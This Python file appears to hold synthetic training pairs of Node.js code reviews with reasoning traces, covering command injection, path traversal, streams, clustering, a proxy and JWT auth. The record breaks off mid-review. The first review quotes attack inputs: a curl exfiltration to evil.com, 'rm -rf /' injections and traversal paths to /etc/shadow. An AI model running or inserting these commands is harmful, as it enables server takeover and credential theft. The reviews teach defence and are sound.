r"""Thinking-trace pairs: Node.js code review and refactoring."""

PAIRS = [
    ("thinking/code-review", r'''Review this Node.js code and identify issues:

```javascript
const express = require('express');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const app = express();
app.use(express.json());

app.post('/api/upload', (req, res) => {
  const { filename, content } = req.body;
  const filepath = path.join(__dirname, 'uploads', filename);
  fs.writeFileSync(filepath, content);
  res.json({ path: filepath });
});

app.get('/api/files/:name', (req, res) => {
  const filepath = path.join(__dirname, 'uploads', req.params.name);
  const content = fs.readFileSync(filepath, 'utf8');
  res.send(content);
});

app.post('/api/convert', (req, res) => {
  const { inputFile, outputFormat } = req.body;
  exec(`ffmpeg -i ${inputFile} -f ${outputFormat} output.${outputFormat}`, (err, stdout, stderr) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    res.json({ output: `output.${outputFormat}` });
  });
});

app.get('/api/logs', (req, res) => {
  const logFile = req.query.file || 'app.log';
  const content = fs.readFileSync(path.join('/var/log', logFile), 'utf8');
  res.send(content);
});

app.post('/api/execute', (req, res) => {
  const { command } = req.body;
  exec(command, { timeout: 5000 }, (err, stdout, stderr) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    res.json({ stdout, stderr });
  });
});

process.on('uncaughtException', (err) => {
  console.log('Error:', err.message);
});

app.listen(3000, () => console.log('Server running'));
```''', r'''<think>
This code has numerous critical security vulnerabilities.

1. Command injection - /api/execute:
- Directly executes user-supplied commands. This is a remote code execution (RCE) vulnerability. An attacker can run ANY command on the server: `{"command": "rm -rf /"}` or `{"command": "cat /etc/passwd"}`.

2. Command injection - /api/convert:
- `exec(ffmpeg -i ${inputFile}...)` injects user input into a shell command. An attacker can set inputFile to `; rm -rf / ;` or `$(cat /etc/passwd)`.

3. Path traversal - multiple routes:
- /api/upload: filename could be `../../etc/cron.d/backdoor`
- /api/files/:name: name could be `../../etc/passwd`
- /api/logs: file query param could be `../../etc/shadow`

4. Synchronous file I/O:
- readFileSync and writeFileSync block the event loop. During file operations, the server cannot handle any other requests. For large files, the entire server freezes.

5. Full file path leaked:
- /api/upload returns the absolute filepath in the response, revealing the server's directory structure.

6. uncaughtException handler:
- Only logs and continues. After an uncaught exception, the process is in an unknown state. The recommended behavior is to log, cleanup, and exit. Continuing can cause data corruption.
- Uses console.log instead of console.error.

7. No input validation:
- No size limits on uploads
- No authentication on any endpoint
- No rate limiting

8. Error handling:
- readFileSync throws if file does not exist, crashing the request handler (unhandled). Express catches it but returns a 500 with stack trace in development mode.

Let me write the review.
</think>

## Code Review: Node.js Express Application

### CRITICAL - Remote Code Execution

**RCE1: /api/execute runs arbitrary commands (Severity: CRITICAL)**
```javascript
exec(command, { timeout: 5000 }, (err, stdout, stderr) => {
```
This endpoint executes ANY command the user sends. This is the most dangerous vulnerability possible -- full server compromise with a single request:
```
POST /api/execute {"command": "cat /etc/shadow && curl http://evil.com/steal?data=$(whoami)"}
```
**Remove this endpoint entirely.** There is no safe way to execute arbitrary user commands.

**RCE2: Command injection in /api/convert (Severity: CRITICAL)**
```javascript
exec(`ffmpeg -i ${inputFile} -f ${outputFormat} output.${outputFormat}`)
```
User input is interpolated into a shell command. Attack: `inputFile = "; rm -rf / ;"`. Use `execFile` with an argument array:
```javascript
const { execFile } = require('child_process');
execFile('ffmpeg', ['-i', inputFile, '-f', outputFormat, `output.${outputFormat}`], callback);
```

### CRITICAL - Path Traversal (Multiple)

**PT1: Upload writes to arbitrary paths (Severity: CRITICAL)**
`filename = "../../etc/cron.d/backdoor"` writes outside the uploads directory. Validate and sanitize:
```javascript
const sanitized = path.basename(filename); // strips directory components
const filepath = path.join(__dirname, 'uploads', sanitized);
```

**PT2: File read traversal (Severity: CRITICAL)**
`/api/files/:name` with `name = "../../etc/passwd"` reads any file. Same fix: use `path.basename` and verify the resolved path is within the uploads directory.

**PT3: Log file traversal (Severity: CRITICAL)**
`/api/logs?file=../../etc/shadow` reads password hashes. Validate the file parameter is a simple filename.

### HIGH - Synchronous I/O Blocks Event Loop

**SIO1: readFileSync and writeFileSync (Severity: HIGH)**
```javascript
fs.writeFileSync(filepath, content);
const content = fs.readFileSync(filepath, 'utf8');
```
Synchronous I/O blocks the entire Node.js event loop. During a 100MB file write, zero requests are processed. Use async alternatives:
```javascript
const { writeFile, readFile } = require('fs').promises;
await writeFile(filepath, content);
const content = await readFile(filepath, 'utf8');
```

### HIGH - Unsafe uncaughtException Handler

**UE1: Process continues after uncaught exception (Severity: HIGH)**
```javascript
process.on('uncaughtException', (err) => {
  console.log('Error:', err.message);
});
```
After an uncaught exception, the process state is unknown. Continuing can cause data corruption, memory leaks, or security issues. The correct pattern:
```javascript
process.on('uncaughtException', (err) => {
  console.error('Fatal error:', err);
  process.exit(1); // let process manager restart
});
```

### MEDIUM - Information Leakage

**IL1: Full filesystem path returned (Severity: MEDIUM)**
```javascript
res.json({ path: filepath });
// Returns: {"path": "/home/app/server/uploads/file.txt"}
```
This reveals the server's directory structure. Return a relative URL instead.

### MEDIUM - No Authentication

**AUTH1: All endpoints publicly accessible (Severity: MEDIUM)**
No authentication on any route. Anyone can upload files, read files, execute commands, and read logs.

### MEDIUM - No Error Handling

**EH1: readFileSync throws on missing files (Severity: MEDIUM)**
If a requested file does not exist, `readFileSync` throws ENOENT. Without try-catch, Express returns a 500 with a stack trace (in dev mode). Wrap in try-catch or check file existence first.'''),

    ("thinking/code-review", r'''Review this Node.js code and identify issues:

```javascript
const EventEmitter = require('events');
const { Transform, pipeline } = require('stream');
const fs = require('fs');
const zlib = require('zlib');

class DataProcessor extends EventEmitter {
  constructor() {
    super();
    this.results = [];
    this.processing = false;
  }

  async processFile(inputPath, outputPath) {
    this.processing = true;
    this.emit('start', inputPath);

    const readStream = fs.createReadStream(inputPath);
    const writeStream = fs.createWriteStream(outputPath);
    const gzip = zlib.createGzip();

    const transformer = new Transform({
      transform(chunk, encoding, callback) {
        const lines = chunk.toString().split('\n');
        const processed = lines
          .filter(line => line.trim())
          .map(line => {
            try {
              const data = JSON.parse(line);
              data.processed = true;
              data.timestamp = Date.now();
              return JSON.stringify(data);
            } catch {
              return null;
            }
          })
          .filter(Boolean)
          .join('\n') + '\n';

        this.push(processed);
        callback();
      }
    });

    readStream
      .pipe(transformer)
      .pipe(gzip)
      .pipe(writeStream);

    writeStream.on('finish', () => {
      this.processing = false;
      this.emit('complete', outputPath);
    });

    readStream.on('error', (err) => {
      this.emit('error', err);
    });
  }

  async processMultiple(files) {
    for (const { input, output } of files) {
      await this.processFile(input, output);
    }
    this.emit('allComplete');
  }
}

class MessageQueue extends EventEmitter {
  constructor(maxSize = 1000) {
    super();
    this.queue = [];
    this.maxSize = maxSize;
    this.consumers = [];
  }

  publish(message) {
    if (this.queue.length >= this.maxSize) {
      this.queue.shift();
      this.emit('overflow');
    }
    this.queue.push(message);
    this.emit('message', message);
    this._dispatch();
  }

  subscribe(handler) {
    this.consumers.push(handler);
  }

  _dispatch() {
    while (this.queue.length > 0 && this.consumers.length > 0) {
      const message = this.queue.shift();
      const consumer = this.consumers[Math.floor(Math.random() * this.consumers.length)];
      consumer(message);
    }
  }
}

const processor = new DataProcessor();
processor.on('error', console.error);
processor.on('complete', (path) => console.log(`Done: ${path}`));
```''', r'''<think>
Let me review this Node.js stream and event emitter code.

1. Stream pipeline issues:
- processFile uses .pipe() chain but does not properly handle errors. Only readStream has an error handler. If the transformer or gzip throws, or writeStream encounters an error, it is unhandled. Use the pipeline() utility which handles error propagation:
```javascript
pipeline(readStream, transformer, gzip, writeStream, (err) => {
  if (err) this.emit('error', err);
  else this.emit('complete', outputPath);
});
```

2. processFile is not actually async:
- The function is declared async but does not await anything. It sets up a pipe chain and returns immediately. The `processMultiple` function calls `await this.processFile(input, output)`, but since processFile returns a resolved promise (no await inside), all files are processed concurrently, not sequentially.
- The function should return a promise that resolves when the pipeline completes.

3. Transform chunk boundary issue:
- The transformer splits chunks by newline, but chunks from readStream do not respect line boundaries. A JSON object could be split across two chunks:
  - Chunk 1: `{"name": "Al`
  - Chunk 2: `ice"}\n{"name": "Bob"}\n`
- The JSON.parse on the partial line fails silently (caught by try-catch). Data is silently lost.
- Need a line buffer that accumulates partial lines.

4. MessageQueue issues:
- _dispatch runs synchronously when publish is called. If a consumer is slow (synchronous blocking), the entire dispatch blocks.
- Random consumer selection is not round-robin. Some consumers may get many messages while others get few.
- If a consumer throws, the error is unhandled and may crash the process.
- The queue is emptied in _dispatch even if not all consumers are available. Messages are consumed by a single consumer, not broadcast.

5. MessageQueue overflow:
- When the queue exceeds maxSize, the oldest message is silently dropped. An 'overflow' event is emitted but the dropped message is lost. For a queue, this is typically unacceptable. Should either reject the publish or apply backpressure.

6. Memory management:
- DataProcessor stores results in this.results but never uses it. If processMultiple is called with many files, this could accumulate data.
- The MessageQueue consumers array has no way to remove consumers (no unsubscribe).

Let me write the review.
</think>

## Code Review: Node.js Streams and Event Emitters

### CRITICAL - Line Boundary Corruption in Transform

**LB1: JSON split across chunks causes data loss (Severity: CRITICAL)**
```javascript
const lines = chunk.toString().split('\n');
```
Stream chunks do not respect line boundaries. A JSON object can be split across two chunks. The partial JSON on each side fails `JSON.parse` and is silently discarded. For a 1GB file, significant data loss occurs.

Fix with a line buffer:
```javascript
const transformer = new Transform({
  construct(callback) {
    this.buffer = '';
    callback();
  },
  transform(chunk, encoding, callback) {
    this.buffer += chunk.toString();
    const lines = this.buffer.split('\n');
    this.buffer = lines.pop(); // keep incomplete line
    const processed = lines
      .filter(line => line.trim())
      .map(line => { /* ... */ })
      .filter(Boolean)
      .join('\n');
    if (processed) this.push(processed + '\n');
    callback();
  },
  flush(callback) {
    if (this.buffer.trim()) {
      // process remaining data
    }
    callback();
  }
});
```

### HIGH - Error Propagation Missing in Pipeline

**EP1: Only readStream errors handled (Severity: HIGH)**
```javascript
readStream.on('error', (err) => { this.emit('error', err); });
```
Errors from `transformer`, `gzip`, or `writeStream` are unhandled. A write error (disk full, permission denied) or gzip corruption crashes silently. Use the `pipeline` utility:
```javascript
const { pipeline } = require('stream');
pipeline(readStream, transformer, gzip, writeStream, (err) => {
  this.processing = false;
  if (err) this.emit('error', err);
  else this.emit('complete', outputPath);
});
```

### HIGH - processFile is Not Awaitable

**AW1: Async function returns before completion (Severity: HIGH)**
```javascript
async processFile(inputPath, outputPath) {
  // sets up pipes and returns immediately
}

async processMultiple(files) {
  for (const { input, output } of files) {
    await this.processFile(input, output); // does NOT wait for file processing
  }
  this.emit('allComplete'); // fires before any file is done
}
```
`processFile` returns a resolved promise immediately. All files start processing concurrently and `allComplete` fires before any file finishes. Return a promise:
```javascript
processFile(inputPath, outputPath) {
  return new Promise((resolve, reject) => {
    pipeline(readStream, transformer, gzip, writeStream, (err) => {
      if (err) reject(err);
      else resolve(outputPath);
    });
  });
}
```

### MEDIUM - Consumer Error Handling in Queue

**CE1: Consumer exceptions crash the process (Severity: MEDIUM)**
```javascript
_dispatch() {
  while (this.queue.length > 0 && this.consumers.length > 0) {
    const message = this.queue.shift();
    consumer(message); // if this throws, dispatch stops
  }
}
```
If a consumer throws, the remaining messages in the queue are not dispatched. Wrap in try-catch:
```javascript
try {
  consumer(message);
} catch (err) {
  this.emit('consumerError', { error: err, message });
}
```

### MEDIUM - Queue Overflow Drops Messages

**QO1: Silent message loss on overflow (Severity: MEDIUM)**
When the queue is full, `this.queue.shift()` drops the oldest message with only an event emission. For many use cases, dropping messages silently is unacceptable. Options:
- Return false from publish (backpressure)
- Throw an error
- Persist overflow to disk

### LOW - No Unsubscribe

**US1: Consumers cannot be removed (Severity: LOW)**
`subscribe` adds to the array but there is no `unsubscribe`. Consumers accumulate forever. Return an unsubscribe function:
```javascript
subscribe(handler) {
  this.consumers.push(handler);
  return () => {
    this.consumers = this.consumers.filter(c => c !== handler);
  };
}
```'''),

    ("thinking/code-review", r'''Review this Node.js code and identify issues:

```javascript
const cluster = require('cluster');
const os = require('os');
const http = require('http');
const { Worker } = require('worker_threads');

if (cluster.isPrimary) {
  const numCPUs = os.cpus().length;
  console.log(`Primary ${process.pid} is running`);

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} died`);
    cluster.fork();
  });
} else {
  const server = http.createServer(async (req, res) => {
    if (req.url === '/health') {
      res.writeHead(200);
      res.end('OK');
    } else if (req.url === '/compute') {
      const result = heavyComputation();
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ result }));
    } else if (req.url === '/async-compute') {
      const worker = new Worker('./compute-worker.js');
      worker.on('message', (result) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ result }));
      });
      worker.on('error', (err) => {
        res.writeHead(500);
        res.end(err.message);
      });
      worker.postMessage({ data: 'compute' });
    } else if (req.url.startsWith('/api/')) {
      let body = '';
      req.on('data', chunk => body += chunk);
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          handleApiRequest(req, res, data);
        } catch (err) {
          res.writeHead(400);
          res.end('Invalid JSON');
        }
      });
    } else {
      res.writeHead(404);
      res.end('Not found');
    }
  });

  server.listen(3000);
  console.log(`Worker ${process.pid} started`);
}

function heavyComputation() {
  let result = 0;
  for (let i = 0; i < 1e9; i++) {
    result += Math.sqrt(i);
  }
  return result;
}

function handleApiRequest(req, res, data) {
  // Process API request
  const response = processData(data);
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(response));
}
```''', r'''<think>
Let me review this Node.js clustering and worker code.

1. /compute blocks the event loop:
- heavyComputation() runs a billion iterations synchronously. This blocks the entire worker process for seconds. During this time, the worker cannot handle ANY other requests, including health checks. The load balancer might think the worker is dead.
- This is exactly why worker_threads exist. The /async-compute endpoint correctly offloads to a worker thread.

2. Worker thread creation per request:
- /async-compute creates a new Worker for EVERY request. Worker creation is expensive (spawning a thread, loading a JS file). For high-traffic endpoints, this creates thousands of workers, exhausting system resources.
- Should use a worker pool that reuses workers.

3. No body size limit:
- The /api/ endpoint reads the entire body with `body += chunk`. A malicious client can send gigabytes of data, exhausting memory. No Content-Length check, no size limit.

4. Worker thread cleanup:
- The Worker is created but never terminated. Even after sending the response, the worker thread continues running. Need `worker.terminate()` after completion.
- If the client disconnects before the worker finishes, the response is still sent to a closed connection.

5. Cluster fork on exit:
- `cluster.fork()` on worker exit creates a new worker unconditionally. If a worker crashes immediately on startup (bad config, missing dependency), this creates an infinite fork loop, consuming all CPU.
- No delay or backoff between respawns.
- No limit on the number of respawns.

6. No graceful shutdown:
- No handling for SIGTERM or SIGINT. When the process is killed, active requests are terminated abruptly. Should drain connections before shutting down.

7. Error handling:
- Worker thread errors are caught, but the error message is sent directly to the client, potentially leaking internal details.
- No error handling for the /compute endpoint. If heavyComputation throws, the request hangs.

8. All workers listen on the same port:
- This is actually handled correctly by Node.js cluster module -- the primary distributes connections to workers via round-robin (on most platforms).

Let me write the review.
</think>

## Code Review: Node.js Clustering and Workers

### CRITICAL - Event Loop Blocked by Computation

**BLK1: /compute freezes the worker (Severity: CRITICAL)**
```javascript
} else if (req.url === '/compute') {
  const result = heavyComputation(); // blocks for seconds
```
`heavyComputation()` runs 1 billion synchronous iterations. The worker process is completely frozen during this time -- no other requests are handled, health checks fail, and the load balancer may remove the worker from rotation.

Use the worker thread approach (like /async-compute) or use `setImmediate` to break up computation. But since /async-compute exists, /compute should be removed or redirect to /async-compute.

### HIGH - Worker Thread Per Request

**WT1: New Worker created for every request (Severity: HIGH)**
```javascript
const worker = new Worker('./compute-worker.js');
```
Creating a thread for each request is expensive (thread creation, module loading). Under 1000 requests/second, this spawns 1000 threads, exhausting system resources. Use a worker pool:
```javascript
const { StaticPool } = require('node-worker-threads-pool');
const pool = new StaticPool({ size: os.cpus().length, task: './compute-worker.js' });

// Per request:
const result = await pool.exec({ data: 'compute' });
```

### HIGH - Worker Thread Leak

**WL1: Workers not terminated after completion (Severity: HIGH)**
After sending the message and receiving the result, the Worker thread is never terminated. It stays alive consuming memory. Over time, thousands of zombie threads accumulate:
```javascript
worker.on('message', (result) => {
  res.end(JSON.stringify({ result }));
  worker.terminate(); // clean up
});
```

### HIGH - No Request Body Size Limit

**BS1: Unbounded body accumulation (Severity: HIGH)**
```javascript
req.on('data', chunk => body += chunk);
```
A malicious client can send gigabytes, exhausting server memory. Add a limit:
```javascript
let body = '';
let size = 0;
const MAX_BODY = 1024 * 1024; // 1MB
req.on('data', chunk => {
  size += chunk.length;
  if (size > MAX_BODY) {
    res.writeHead(413);
    res.end('Payload too large');
    req.destroy();
    return;
  }
  body += chunk;
});
```

### HIGH - Infinite Fork Loop

**FL1: Worker respawn has no backoff (Severity: HIGH)**
```javascript
cluster.on('exit', (worker) => {
  cluster.fork();
});
```
If a worker crashes immediately on startup (missing module, bad config), the primary forks a new one instantly, which crashes, which triggers another fork. This infinite loop consumes all CPU. Add rate limiting:
```javascript
let recentDeaths = 0;
cluster.on('exit', (worker) => {
  recentDeaths++;
  if (recentDeaths > 10) {
    console.error('Too many worker deaths, stopping respawn');
    return;
  }
  setTimeout(() => {
    cluster.fork();
    recentDeaths = Math.max(0, recentDeaths - 1);
  }, 1000);
});
```

### MEDIUM - No Graceful Shutdown

**GS1: Active requests killed on shutdown (Severity: MEDIUM)**
No SIGTERM handler. When the process manager sends a shutdown signal, active requests are terminated mid-response. Implement graceful shutdown:
```javascript
process.on('SIGTERM', () => {
  server.close(() => {
    console.log('Graceful shutdown complete');
    process.exit(0);
  });
  setTimeout(() => process.exit(1), 30000); // force after 30s
});
```

### LOW - Client Disconnect Not Handled

**CD1: Worker continues after client disconnects (Severity: LOW)**
If the client closes the connection while the worker thread is computing, the result is sent to a closed socket. Check for client disconnect:
```javascript
req.on('close', () => {
  worker.terminate();
});
```'''),

    ("thinking/code-review", r'''Review this Node.js code and identify issues:

```javascript
const http = require('http');
const https = require('https');
const url = require('url');

class HttpProxy {
  constructor(config) {
    this.targets = config.targets || [];
    this.currentIndex = 0;
    this.healthChecks = new Map();
    this.timeout = config.timeout || 30000;
  }

  getNextTarget() {
    const target = this.targets[this.currentIndex];
    this.currentIndex = (this.currentIndex + 1) % this.targets.length;
    return target;
  }

  async proxyRequest(clientReq, clientRes) {
    const target = this.getNextTarget();
    const targetUrl = url.parse(target);

    const options = {
      hostname: targetUrl.hostname,
      port: targetUrl.port,
      path: clientReq.url,
      method: clientReq.method,
      headers: clientReq.headers,
    };

    const proxyReq = http.request(options, (proxyRes) => {
      clientRes.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(clientRes);
    });

    clientReq.pipe(proxyReq);

    proxyReq.on('error', (err) => {
      clientRes.writeHead(502);
      clientRes.end('Bad Gateway');
    });

    setTimeout(() => {
      proxyReq.destroy();
      if (!clientRes.headersSent) {
        clientRes.writeHead(504);
        clientRes.end('Gateway Timeout');
      }
    }, this.timeout);
  }

  startHealthChecks(interval = 10000) {
    setInterval(() => {
      this.targets.forEach(target => {
        http.get(target + '/health', (res) => {
          this.healthChecks.set(target, res.statusCode === 200);
        }).on('error', () => {
          this.healthChecks.set(target, false);
        });
      });
    }, interval);
  }

  start(port) {
    const server = http.createServer((req, res) => {
      this.proxyRequest(req, res);
    });
    server.listen(port);
    this.startHealthChecks();
    console.log(`Proxy running on port ${port}`);
  }
}

const proxy = new HttpProxy({
  targets: [
    'http://backend1:8080',
    'http://backend2:8080',
    'http://backend3:8080',
  ],
  timeout: 15000,
});

proxy.start(80);
```''', r'''<think>
Let me review this Node.js HTTP proxy.

1. Round-robin ignores health:
- getNextTarget uses simple round-robin but does NOT check the health status. Even if healthChecks shows a target is down, requests are still sent to it. The health check data is collected but never used.

2. Host header forwarding:
- `headers: clientReq.headers` forwards the original Host header. The backend receives requests with the proxy's Host header, not its own hostname. This can cause routing issues on the backend. Should set the Host header to the target's hostname.

3. Timeout implementation:
- The setTimeout creates a timer for EVERY request. These timers are never cleared on successful completion. If the request completes in 1 second but the timeout is 15 seconds, the timer still fires after 15 seconds and tries to destroy an already-completed request. While `headersSent` check prevents double-response, calling `proxyReq.destroy()` on a completed request is wasteful.

4. No HTTPS support:
- Always uses `http.request` even if targets could be HTTPS. The url.parse detects the protocol but the code always uses http module.

5. Health check issues:
- Health checks use http.get but do not handle HTTPS targets.
- The response body from health check is not consumed, causing the socket to stay open. Must consume the response:
```javascript
res.resume(); // discard body
```
- No timeout on health checks. If a backend hangs, the health check request hangs forever.

6. Error handling:
- proxyReq error handler sends 502 to client, but does not check if headers were already sent. If the backend sends partial response then errors, pipe has already sent headers.
- No error handler on clientReq -- if the client disconnects mid-request, the proxy request continues.

7. Memory leak:
- healthChecks Map grows if targets are removed from the config. No cleanup.
- setInterval for health checks is never stopped. No way to gracefully shut down.

8. Connection pooling:
- http.request creates a new connection for each proxied request. No connection pooling or keep-alive to backends. This is inefficient for high traffic.

Let me write the review.
</think>

## Code Review: Node.js HTTP Proxy

### HIGH - Health Checks Not Used in Routing

**HC1: Requests sent to unhealthy targets (Severity: HIGH)**
```javascript
getNextTarget() {
  const target = this.targets[this.currentIndex];
  this.currentIndex = (this.currentIndex + 1) % this.targets.length;
  return target;
}
```
`getNextTarget` cycles through targets regardless of health status. `healthChecks` data is collected but never consulted. Requests are sent to targets that failed their health check:
```javascript
getNextTarget() {
  for (let i = 0; i < this.targets.length; i++) {
    const idx = (this.currentIndex + i) % this.targets.length;
    const target = this.targets[idx];
    if (this.healthChecks.get(target) !== false) {
      this.currentIndex = (idx + 1) % this.targets.length;
      return target;
    }
  }
  // All unhealthy, fall back to round-robin
  return this.targets[this.currentIndex++ % this.targets.length];
}
```

### HIGH - Host Header Leak

**HH1: Client Host header forwarded to backend (Severity: HIGH)**
```javascript
headers: clientReq.headers,
```
The original `Host` header (e.g., `proxy.example.com`) is forwarded to the backend. Many backends use the Host header for routing, virtual hosts, or URL generation. The backend generates URLs with the wrong hostname. Override it:
```javascript
const headers = { ...clientReq.headers, host: targetUrl.host };
```

### HIGH - Timeout Timer Not Cleared

**TC1: Timer fires after request completes (Severity: HIGH)**
```javascript
setTimeout(() => {
  proxyReq.destroy();
}, this.timeout);
```
The timeout timer is never cleared when the request completes successfully. For every request, a timer exists for the full timeout duration. Under 1000 requests/second with 15-second timeout, 15,000 timers are active simultaneously, wasting memory and firing `destroy()` on completed requests.

Fix: Clear the timer on completion:
```javascript
const timer = setTimeout(() => {
  proxyReq.destroy();
  if (!clientRes.headersSent) {
    clientRes.writeHead(504);
    clientRes.end('Gateway Timeout');
  }
}, this.timeout);

proxyRes.on('end', () => clearTimeout(timer));
proxyReq.on('error', () => clearTimeout(timer));
```

### MEDIUM - Health Check Response Body Not Consumed

**HCB1: Socket leak in health checks (Severity: MEDIUM)**
```javascript
http.get(target + '/health', (res) => {
  this.healthChecks.set(target, res.statusCode === 200);
});
```
The response body is not consumed. In Node.js, unconsumed response bodies keep the socket open. Over time, this exhausts available sockets. Add `res.resume()`:
```javascript
http.get(target + '/health', (res) => {
  res.resume(); // discard body, free socket
  this.healthChecks.set(target, res.statusCode === 200);
});
```

### MEDIUM - No HTTPS Support

**TLS1: Always uses http module (Severity: MEDIUM)**
Even if a target URL starts with `https://`, the proxy uses `http.request`. Requests to HTTPS backends fail. Check the protocol:
```javascript
const transport = targetUrl.protocol === 'https:' ? https : http;
const proxyReq = transport.request(options, ...);
```

### MEDIUM - No Connection Pooling

**CP1: New connection per request (Severity: MEDIUM)**
Each proxied request creates a new TCP connection to the backend. For high traffic, this causes excessive connection overhead and potential port exhaustion. Use an HTTP Agent with keep-alive:
```javascript
this.agent = new http.Agent({ keepAlive: true, maxSockets: 100 });
// In request options:
agent: this.agent,
```

### LOW - No Graceful Shutdown

**GS1: No way to stop health checks or drain connections (Severity: LOW)**
The setInterval for health checks is never stored and cannot be cleared. The server has no shutdown mechanism. Store the interval ID and implement a stop method.'''),

    ("thinking/code-review", r'''Review this Node.js code and identify issues:

```javascript
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

const JWT_SECRET = 'my-app-secret-key-2024';
const SALT_ROUNDS = 5;

class AuthService {
  constructor(db) {
    this.db = db;
    this.tokenBlacklist = new Set();
  }

  async register(username, password, email) {
    const hash = await bcrypt.hash(password, SALT_ROUNDS);
    const user = await this.db.users.create({
      data: { username, password: hash, email },
    });
    return this.generateToken(user);
  }

  async login(username, password) {
    const user = await this.db.users.findUnique({ where: { username } });
    if (!user) return null;
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) return null;
    return this.generateToken(user);
  }

  generateToken(user) {
    return jwt.sign(
      { id: user.id, username: user.username, role: user.role, email: user.email },
      JWT_SECRET,
      { expiresIn: '365d' }
    );
  }

  verifyToken(token) {
    if (this.tokenBlacklist.has(token)) return null;
    try {
      return jwt.verify(token, JWT_SECRET);
    } catch {
      return null;
    }
  }

  async changePassword(userId, oldPassword, newPassword) {
    const user = await this.db.users.findUnique({ where: { id: userId } });
    const valid = await bcrypt.compare(oldPassword, user.password);
    if (!valid) throw new Error('Invalid password');
    const hash = await bcrypt.hash(newPassword, SALT_ROUNDS);
    await this.db.users.update({
      where: { id: userId },
      data: { password: hash },
    });
  }

  logout(token) {
    this.tokenBlacklist.add(token);
  }

  async resetPassword(email) {
    const user = await this.db.users.findUnique({ where: { email } });
    if (!user) return;
    const resetToken = crypto.randomBytes(16).toString('hex');
    await this.db.users.update({
      where: { id: user.id },
      data: { resetToken, resetTokenExpiry: new Date(Date.now() + 3600000) },
    });
    await sendEmail(email, `Reset link: https://app.com/reset?token=${resetToken}`);
  }

  async confirmReset(resetToken, newPassword) {
    const user = await this.db.users.findFirst({
      where: { resetToken, resetTokenExpiry: { gt: new Date() } },
    });
    if (!user) throw new Error('Invalid or expired token');
    const hash = await bcrypt.hash(newPassword, SALT_ROUNDS);
    await this.db.users.update({
      where: { id: user.id },
      data: { password: hash, resetToken: null, resetTokenExpiry: null },
    });
  }
}
```''', r'''<think>
Let me review this Node.js authentication service.

1. Hardcoded JWT secret:
- JWT_SECRET = 'my-app-secret-key-2024' is hardcoded in source code. Anyone with code access can forge tokens. Must use environment variable.

2. SALT_ROUNDS too low:
- SALT_ROUNDS = 5 is very low. The recommended minimum is 10-12. At 5 rounds, bcrypt is fast enough for brute-force attacks. Each additional round doubles the computation time.

3. Token expiry too long:
- expiresIn: '365d' means tokens last a year. If a token is compromised, the attacker has 365 days of access. Even with a blacklist, the in-memory blacklist is lost on restart.

4. In-memory token blacklist:
- tokenBlacklist is a Set stored in memory. Issues:
  - Lost on server restart (revoked tokens become valid again)
  - Not shared across multiple server instances (load balanced)
  - Grows without bound (no cleanup of expired tokens)
  - Memory leak over time

5. JWT payload too large:
- Token includes id, username, role, AND email. JWT is sent with every request. Including email is unnecessary for authorization and increases token size. If email changes, old tokens have stale data.

6. No password strength validation:
- register and changePassword accept any password. No minimum length, complexity, or common-password checks.

7. Reset token issues:
- Reset token is stored in the database but not hashed. If the database is compromised, attackers can see pending reset tokens and use them.
- The reset link is hardcoded: `https://app.com/reset?token=${resetToken}`. Should use configuration.
- resetPassword does not tell the caller whether the email exists or not (returns void in both cases). This is actually GOOD practice to prevent email enumeration.

8. changePassword does not invalidate tokens:
- After changing password, all existing tokens (including potentially stolen ones) remain valid for up to 365 days. Should invalidate all existing tokens.

9. login timing attack:
- If username does not exist, the function returns immediately. If username exists, it runs bcrypt.compare. An attacker can determine valid usernames by timing the response. Run a dummy bcrypt operation for non-existent users.

Let me write the review.
</think>

## Code Review: Node.js Authentication Service

### CRITICAL - Hardcoded JWT Secret

**SEC1: Secret in source code (Severity: CRITICAL)**
```javascript
const JWT_SECRET = 'my-app-secret-key-2024';
```
Anyone with code access (developers, CI/CD, GitHub breach) can forge valid JWT tokens. Use an environment variable:
```javascript
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) throw new Error('JWT_SECRET must be set');
```

### HIGH - Weak bcrypt Configuration

**BC1: SALT_ROUNDS = 5 is too fast (Severity: HIGH)**
At 5 rounds, bcrypt is fast enough for offline brute-force attacks. The recommended minimum is 10-12 rounds. Each additional round doubles computation time:
```javascript
const SALT_ROUNDS = 12;
```
At 12 rounds, bcrypt takes ~250ms per hash, making brute force impractical.

### HIGH - Token Valid for 365 Days

**TK1: One-year token expiry (Severity: HIGH)**
A compromised token gives an attacker 365 days of access. Use short-lived access tokens (15-30 minutes) with a refresh token mechanism:
```javascript
generateTokens(user) {
  const access = jwt.sign({ id: user.id, role: user.role }, JWT_SECRET, { expiresIn: '15m' });
  const refresh = jwt.sign({ id: user.id }, JWT_REFRESH_SECRET, { expiresIn: '7d' });
  return { access, refresh };
}
```

### HIGH - In-Memory Token Blacklist

**BL1: Blacklist lost on restart (Severity: HIGH)**
```javascript
this.tokenBlacklist = new Set();
```
On server restart, the blacklist is empty and all previously revoked tokens become valid again. With a 365-day expiry, this is a significant window. Store the blacklist in Redis or a database.

**BL2: Blacklist grows unboundedly**
Expired tokens are never removed from the Set. Over a year, millions of entries accumulate. Add periodic cleanup or use a data structure with TTL.

### HIGH - Password Change Does Not Revoke Tokens

**PC1: Old tokens valid after password change (Severity: HIGH)**
After `changePassword`, existing tokens (including stolen ones) remain valid for up to 365 days. Add a `tokenVersion` to the user record and include it in the JWT. Increment on password change, invalidating all old tokens.

### MEDIUM - Timing Attack on Login

**TA1: Username enumeration via timing (Severity: MEDIUM)**
```javascript
const user = await this.db.users.findUnique({ where: { username } });
if (!user) return null;  // fast path
const valid = await bcrypt.compare(password, user.password); // slow path
```
Non-existent usernames return instantly. Existing usernames run bcrypt (~250ms). An attacker can distinguish by response time. Run a dummy compare:
```javascript
if (!user) {
